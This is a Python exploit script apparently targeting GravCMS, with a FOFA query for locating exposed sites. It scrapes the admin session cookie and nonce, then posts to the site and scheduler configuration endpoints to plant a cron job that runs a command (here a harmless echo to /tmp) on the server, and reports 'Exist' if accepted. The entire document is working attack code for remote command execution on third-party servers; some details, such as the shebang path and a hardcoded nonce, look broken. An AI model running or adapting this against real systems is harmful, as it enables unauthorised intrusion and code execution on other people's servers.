#!/bin/usr/env python3
# _*_ coding:utf-8 _*_

import re
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+    fofa:   "GravCMS"')


def run_proto(url):
    url1 = url + '/admin'
    headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
              }

    data = '''task=SavaDefault&data[title]=PWNED&admin-nonce=wertfdsdfdcvcvcxcvc'''
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=url1, headers=headers, allow_redirects=False, verify=False, timeout=(3, 3))
        cookie = re.search(r'grav-site-[a-z0-9]+-admin=(\S*)', str(response.cookies), re.I).group()
        loginnonce = re.search(r'type=\"hidden\".{1,1000}value=\"(.*?)\"', response.text, re.I).group(1)
        print(loginnonce)
        print(cookie)
        headers1 = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Cookie': cookie
        }
        data = '''task=SavaDefault&data[title]=PWNED&admin-nonce={}'''.format(loginnonce)
        data1 = '''task=SaveDefault&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bcommand%5D=/usr/bin/echo
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bargs%5D=1337
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bat%5D=*+*+*+*+*
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Boutput%5D=/tmp/1.txt
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Boutput_mode%5D=append
&admin-nonce=b78bb0a12604579896f9b4796dde8833'''
        requests.post(url + '/admin/config/site', headers=headers1, data=data, allow_redirects=False, verify=False, timeout=(3, 3))
        third = requests.post(url + '/admin/config/scheduler', headers=headers1, data=data1, allow_redirects=False, verify=False, timeout=(3, 3))
        if third.status_code == 200:
            print(url + 'Exist')
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False


def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')
